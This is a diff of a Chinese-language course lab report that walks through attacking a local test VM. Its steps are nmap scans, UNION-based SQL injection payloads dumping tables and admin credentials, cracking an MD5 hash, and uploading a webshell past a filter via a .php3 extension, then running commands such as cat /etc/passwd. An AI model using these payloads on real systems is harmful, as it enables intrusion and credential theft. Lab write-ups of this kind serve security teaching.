@@ -14,9 +14,9 @@
 
 将攻击者主机KaliAttack和受害者主机DebianTarget都设置为Host-only网络
 
-![2](/Users/cookie/Documents/GitHub/2018-NS-Public-SunnyCcc/ns-0x07/2.jpg)
+![2](/ns-0x07/2.jpg)
 
-![3](/Users/cookie/Documents/GitHub/2018-NS-Public-SunnyCcc/ns-0x07/3.jpg)
+![3](/ns-0x07/3.jpg)
 
 ### 2.2 网卡信息
 
@@ -24,29 +24,29 @@ KaliAttack攻击者主机为 192.168.68.4
 
 DebianTarget受害者主机 192.168.68.3
 
-![4](/Users/cookie/Documents/GitHub/2018-NS-Public-SunnyCcc/ns-0x07/4.jpg)
+![4](/ns-0x07/4.jpg)
 
 
 
-![5](/Users/cookie/Documents/GitHub/2018-NS-Public-SunnyCcc/ns-0x07/5.jpg)
+![5](/ns-0x07/5.jpg)
 
 ### 2.3 查看攻击者主机可攻击服务器范围
 
 ```nmap -sP 192.168.68.0/24```确认受害者主机在攻击者主机可攻击范围内
 
-![6](/Users/cookie/Documents/GitHub/2018-NS-Public-SunnyCcc/ns-0x07/6.jpg)
+![6](/ns-0x07/6.jpg)
 
 ```nmap -A 192.168.68.3``` 对受害者主机进行端口扫描
 
-![7](/Users/cookie/Documents/GitHub/2018-NS-Public-SunnyCcc/ns-0x07/7.jpg)
+![7](/ns-0x07/7.jpg)
 
 扫描网段 `netdiscover -r 192.168.1.0/24`
 
-![1](/Users/cookie/Documents/GitHub/2018-NS-Public-SunnyCcc/ns-0x07/1.jpg)
+![1](/ns-0x07/1.jpg)
 
 确保攻击者主机可以ping通受害者主机
 
-![8](/Users/cookie/Documents/GitHub/2018-NS-Public-SunnyCcc/ns-0x07/8.jpg)
+![8](/ns-0x07/8.jpg)
 
 ## 3、 实验测试
 
@@ -54,11 +54,11 @@ DebianTarget受害者主机 192.168.68.3
 
 浏览器访问`192.168.68.3`
 
-![9](/Users/cookie/Documents/GitHub/2018-NS-Public-SunnyCcc/ns-0x07/9.jpg)
+![9](/ns-0x07/9.jpg)
 
 查看网页源码，看到很多PHP连接，后台使用的是PHP
 
-![10](/Users/cookie/Documents/GitHub/2018-NS-Public-SunnyCcc/ns-0x07/10.jpg)
+![10](/ns-0x07/10.jpg)
 
 ### 3.2 分析php连接
 
@@ -72,23 +72,23 @@ DebianTarget受害者主机 192.168.68.3
 
 ```all.php ```显示全部三张图片
 
-![14](/Users/cookie/Documents/GitHub/2018-NS-Public-SunnyCcc/ns-0x07/14.jpg)
+![14](/ns-0x07/4.jpg)
 
  `cat.php?id=1`  会显示两张图片
 
-![11](/Users/cookie/Documents/GitHub/2018-NS-Public-SunnyCcc/ns-0x07/11.jpg)
+![11](/ns-0x07/11.jpg)
 
 `cat.php?id=2`  会显示一张图片
 
-![12](/Users/cookie/Documents/GitHub/2018-NS-Public-SunnyCcc/ns-0x07/12.jpg)
+![12](/ns-0x07/12.jpg)
 
 `cat.php?id=3`  没有图片显示
 
-![13](/Users/cookie/Documents/GitHub/2018-NS-Public-SunnyCcc/ns-0x07/13.jpg)
+![13](/ns-0x07/13.jpg)
 
 ```admin/login.php```  是一个登录界面
 
-![15](/Users/cookie/Documents/GitHub/2018-NS-Public-SunnyCcc/ns-0x07/15.jpg)
+![15](/ns-0x07/15.jpg)
 
 通过测试可以得知，网页存在SQL注入漏洞。我们可以找到漏洞，在数据库中查找到用于用户登录到用户名和密码。
 
@@ -106,7 +106,7 @@ DebianTarget受害者主机 192.168.68.3
 
 　　然后访问该链接地址，浏览器可能会返回类似于下面的错误提示信息：Microsoft JET Database Engine 错误’80040e14’。字符串的语法错误在查询表达式’ID=YY’中。
 
-![16](/Users/cookie/Documents/GitHub/2018-NS-Public-SunnyCcc/ns-0x07/16.jpg)
+![16](/ns-0x07/16.jpg)
 
 #### 4.1.2 “1=1和1=2”法 
 
@@ -124,9 +124,9 @@ DebianTarget受害者主机 192.168.68.3
 
 　　Ø 提示BOF或EOF(程序没做任何判断时)，或提示找不到记录，或显示内容为空(程序加了on error resume next)，如图1.4所示。!17](/Users/cookie/Documents/GitHub/2018-NS-Public-SunnyCcc/ns-0x07/17.jpg)
 
-![17](/Users/cookie/Documents/GitHub/2018-NS-Public-SunnyCcc/ns-0x07/17.jpg)
+![17](/ns-0x07/17.jpg)
 
-![18](/Users/cookie/Documents/GitHub/2018-NS-Public-SunnyCcc/ns-0x07/18.jpg)
+![18](/ns-0x07/18.jpg)
 
 ### 4.2 利用UNION关键字进行SQL注入
 
@@ -134,13 +134,13 @@ DebianTarget受害者主机 192.168.68.3
 
 从UNION=1开始进行猜测：```http://192.168.68.3/cat.php?id=1%20UNION%20SELECT%201```
 
-![19](/Users/cookie/Documents/GitHub/2018-NS-Public-SunnyCcc/ns-0x07/19.jpg)
+![19](/ns-0x07/19.jpg)
 
 依次猜测UNION=2，3……发现当UNION=4的时候有图片显示，且出现了之前没有出现的picture：2，**我们可以将后续查找中的输出内容放在这个位置。**；当UNION=5的时候没有图片显示。
 
-![20](/Users/cookie/Documents/GitHub/2018-NS-Public-SunnyCcc/ns-0x07/20.jpg)
+![20](/ns-0x07/20.jpg)
 
-![23](/Users/cookie/Documents/GitHub/2018-NS-Public-SunnyCcc/ns-0x07/23.jpg)
+![23](/ns-0x07/23.jpg)
 
 **综上，数据库UNION=4**
 
@@ -150,45 +150,45 @@ DebianTarget受害者主机 192.168.68.3
 
 1）查看版本信息```http://192.168.68.3/cat.php?id=1 UNION SELECT 1,@@version,3,4```
 
-![24](/Users/cookie/Documents/GitHub/2018-NS-Public-SunnyCcc/ns-0x07/24.jpg)
+![24](/ns-0x07/24.jpg)
 
 2）查看当前用户信息```http://192.168.68.3/cat.php?id=1 UNION SELECT 1,current_user(),3,4```
 
-![25](/Users/cookie/Documents/GitHub/2018-NS-Public-SunnyCcc/ns-0x07/25.jpg)
+![25](/ns-0x07/25.jpg)
 
 3）查看数据库信息```http://192.168.68.3/cat.php?id=1 UNION SELECT 1,database(),3,4```
 
-![26](/Users/cookie/Documents/GitHub/2018-NS-Public-SunnyCcc/ns-0x07/26.jpg)
+![26](/ns-0x07/26.jpg)
 
 4）查看所有表的列表```http://192.168.68.3/cat.php?id=1 UNION SELECT 1,table_name,3,4 FROM information_schema.tables```
 
-![27](/Users/cookie/Documents/GitHub/2018-NS-Public-SunnyCcc/ns-0x07/27.jpg)
+![27](/ns-0x07/27.jpg)
 
 5）查看所有列的列表	```http://192.168.68.3/cat.php?id=1 UNION SELECT 1,column_name,3,4 FROM information_schema.columns```
 
-![32](/Users/cookie/Documents/GitHub/2018-NS-Public-SunnyCcc/ns-0x07/32.jpg)
+![32](/ns-0x07/32.jpg)
 
 6）连接表和列。在user表中看到有用户和密码列。```http://192.168.68.3/cat.php?id=1 UNION SELECT 1,concat(table_name,':', column_name),3,4 FROM information_schema.columns```
 
-![33](/Users/cookie/Documents/GitHub/2018-NS-Public-SunnyCcc/ns-0x07/33.jpg)
+![33](/ns-0x07/33.jpg)
 
 #### 4.2.3 破解管理员登录密码
 
 1. 获取管理员登录密码 ```192.168.68.3/cat.php?id=0 UNION SELECT 1,concat(id,':',login,':',password),3,4 FROM users```
 
-![34](/Users/cookie/Documents/GitHub/2018-NS-Public-SunnyCcc/ns-0x07/34.jpg)
+![34](/ns-0x07/34.jpg)
 
 2. 网页在线破解 搜索 ```MD5 8efe310f9ab3efeae8d410a8e0166eb2```
 
-![35](/Users/cookie/Documents/GitHub/2018-NS-Public-SunnyCcc/ns-0x07/35.jpg)
+![35](/ns-0x07/35.jpg)
 
 ### 4.3 登录管理员账号
 
 用破解得到的用户名及密码登录管理员账号
 
-![36](/Users/cookie/Documents/GitHub/2018-NS-Public-SunnyCcc/ns-0x07/36.jpg)
+![36](/ns-0x07/36.jpg)
 
-![39](/Users/cookie/Documents/GitHub/2018-NS-Public-SunnyCcc/ns-0x07/39.jpg)
+![39](/ns-0x07/39.jpg)
 
 ## 5、 webshell 实验
 
@@ -196,7 +196,7 @@ DebianTarget受害者主机 192.168.68.3
 
 发现可以提交文件，我们使用管理员用户上传构建的webshell
 
-![38](/Users/cookie/Documents/GitHub/2018-NS-Public-SunnyCcc/ns-0x07/38.jpg)
+![38](/ns-0x07/8.jpg)
 
 > webshell就是以asp、php、jsp或者cgi等网页文件形式存在的一种命令执行环境，也可以将其称做为一种网页后门。黑客在入侵了一个网站后，通常会将asp或php后门文件与网站服务器WEB目录下正常的网页文件混在一起，然后就可以使用浏览器来访问asp或者php后门，得到一个命令执行环境，以达到控制网站服务器的目的。
 
@@ -204,17 +204,17 @@ DebianTarget受害者主机 192.168.68.3
 
 我们尝试构建用于上传的webshell,命名为web.php,并提交，发现PHP文件被过滤掉。
 
-![41](/Users/cookie/Documents/GitHub/2018-NS-Public-SunnyCcc/ns-0x07/41.jpg)
+![41](/ns-0x07/41.jpg)
 
-![40](/Users/cookie/Documents/GitHub/2018-NS-Public-SunnyCcc/ns-0x07/40.jpg)
+![40](/ns-0x07/40.jpg)
 
- ![42](/Users/cookie/Documents/GitHub/2018-NS-Public-SunnyCcc/ns-0x07/42.jpg)
+ ![42](/ns-0x07/42.jpg)
 
 修改文件后缀名为 .php3,成功提交。
 
-![47](/Users/cookie/Documents/GitHub/2018-NS-Public-SunnyCcc/ns-0x07/47.jpg)
+![47](/ns-0x07/47.jpg)
 
-![46](/Users/cookie/Documents/GitHub/2018-NS-Public-SunnyCcc/ns-0x07/46.jpg)
+![46](/ns-0x07/46.jpg)
 
 ### 5.2 测试WebShell
 
@@ -222,15 +222,15 @@ DebianTarget受害者主机 192.168.68.3
 
  1）查看内核：```http://192.168.68.3/admin/uploads/web.php3?cmd=uname```
 
-![45](/Users/cookie/Documents/GitHub/2018-NS-Public-SunnyCcc/ns-0x07/45.jpg)
+![45](/ns-0x07/45.jpg)
 
 2）查看当前目录内容：```http://192.168.68.3/admin/uploads/web.php3?cmd=ls -u```
 
-![48](/Users/cookie/Documents/GitHub/2018-NS-Public-SunnyCcc/ns-0x07/48.jpg)
+![48](/ns-0x07/48.jpg)
 
 3）获取靶机系统用户列表:```192.168.68.3/admin/uploads/web.php3?cmd=cat /etc/passwd```
 
-![49](/Users/cookie/Documents/GitHub/2018-NS-Public-SunnyCcc/ns-0x07/49.jpg)
+![49](/ns-0x07/49.jpg)
 
 6、 参考
 
